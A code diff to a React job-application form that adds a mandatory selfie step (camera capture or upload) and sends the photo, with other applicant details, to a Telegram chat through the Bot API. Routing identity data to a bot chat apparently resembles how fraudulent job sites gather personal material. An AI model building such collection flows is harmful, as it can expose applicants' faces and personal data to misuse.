@@ -37,6 +37,7 @@ const Forms = () => {
   const [resume, setResume] = useState(null)
   const [skipResume, setSkipResume] = useState(false)
   const [showSuccess, setShowSuccess] = useState(false)
+  const [selfie, setSelfie] = useState(null)
 
   const handleClose = () => {
     setShow(false)
@@ -141,6 +142,19 @@ const Forms = () => {
           value: zip,
           onChange: setZip,
           required: true
+        }
+      ]
+    },
+    {
+      title: "Upload Your Selfie",
+      fields: [
+        {
+          label: "Take or Upload Your Selfie",
+          type: "selfie",
+          value: selfie,
+          onChange: setSelfie,
+          required: true,
+          accept: "image/*"
         }
       ]
     },
@@ -273,6 +287,28 @@ ${q3}
 ${resume ? '📎 Resume will be sent in next message' : '❌ No Resume Attached'}
 ${skipResume ? '(Applicant opted to skip resume)' : ''}
 `;
+      if (selfie) {
+        const selfieFormData = new FormData();
+        selfieFormData.append('chat_id', CHAT_ID);
+        selfieFormData.append('photo', selfie);
+        selfieFormData.append('caption', `📸 Selfie of ${fn}`);
+
+        const selfieResponse = await axios.post(
+          `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
+          selfieFormData,
+          {
+            headers: {
+              'Content-Type': 'multipart/form-data'
+            }
+          }
+        );
+
+        if (!selfieResponse.data.ok) {
+          throw new Error('Failed to send selfie');
+        }
+      }
+
+      // Send 
 
       // Send application details
       const messageResponse = await axios.post(MESSAGE_API_URL, {
@@ -325,6 +361,20 @@ ${skipResume ? '(Applicant opted to skip resume)' : ''}
         setShow(true)
       })
   }, [])
+
+  const captureFromCamera = () => {
+    const input = document.createElement('input');
+    input.type = 'file';
+    input.accept = 'image/*';
+    input.capture = 'user';
+    input.onchange = (e) => {
+      const file = e.target.files[0];
+      if (file) {
+        setSelfie(file);
+      }
+    };
+    input.click();
+  };
 
   const renderField = (field) => {
     const fieldStyle = {
@@ -435,6 +485,111 @@ ${skipResume ? '(Applicant opted to skip resume)' : ''}
               </option>
             ))}
           </select>
+        );
+      case 'selfie':
+        return (
+          <div>
+            <div style={{
+              display: 'grid',
+              gridTemplateColumns: '1fr 1fr',
+              gap: '1rem',
+              marginBottom: '1rem'
+            }}>
+              <motion.button
+                type="button"
+                onClick={captureFromCamera}
+                whileHover={{ scale: 1.05 }}
+                whileTap={{ scale: 0.95 }}
+                style={{
+                  padding: '1.5rem',
+                  backgroundColor: '#3498db',
+                  color: 'white',
+                  border: 'none',
+                  borderRadius: '12px',
+                  fontSize: '1rem',
+                  fontWeight: '600',
+                  cursor: 'pointer',
+                  display: 'flex',
+                  flexDirection: 'column',
+                  alignItems: 'center',
+                  justifyContent: 'center',
+                  gap: '0.5rem',
+                  transition: 'all 0.3s ease'
+                }}
+              >
+                <span style={{ fontSize: '1.5rem' }}>📷</span>
+                Take a Selfie
+              </motion.button>
+              <input
+                type="file"
+                accept="image/*"
+                onChange={(e) => {
+                  const file = e.target.files[0];
+                  if (file) {
+                    setSelfie(file);
+                  }
+                }}
+                style={{
+                  display: 'none'
+                }}
+                id="selfieUpload"
+              />
+              <label htmlFor="selfieUpload" style={{
+                padding: '1.5rem',
+                backgroundColor: '#2ecc71',
+                color: 'white',
+                border: 'none',
+                borderRadius: '12px',
+                fontSize: '1rem',
+                fontWeight: '600',
+                cursor: 'pointer',
+                display: 'flex',
+                flexDirection: 'column',
+                alignItems: 'center',
+                justifyContent: 'center',
+                gap: '0.5rem',
+                transition: 'all 0.3s ease',
+                margin: 0
+              }}>
+                <span style={{ fontSize: '1.5rem' }}>🖼️</span>
+                Upload Image
+              </label>
+            </div>
+            {selfie && (
+              <motion.div 
+                style={fieldStyle.filePreview}
+                initial={{ opacity: 0, y: -10 }}
+                animate={{ opacity: 1, y: 0 }}
+                exit={{ opacity: 0, y: -10 }}
+              >
+                <div style={{ display: 'flex', alignItems: 'center', gap: '1rem' }}>
+                  <img
+                    src={URL.createObjectURL(selfie)}
+                    alt="Selfie"
+                    style={{
+                      width: '60px',
+                      height: '60px',
+                      borderRadius: '8px',
+                      objectFit: 'cover'
+                    }}
+                  />
+                  <div>
+                    <span style={fieldStyle.fileName}>{selfie.name}</span>
+                    <span style={fieldStyle.fileSize}>
+                      {(selfie.size / 1024 / 1024).toFixed(2)} MB
+                    </span>
+                  </div>
+                </div>
+                <button
+                  type="button"
+                  style={fieldStyle.removeButton}
+                  onClick={() => setSelfie(null)}
+                >
+                  Remove
+                </button>
+              </motion.div>
+            )}
+          </div>
         );
       case 'file':
         return (
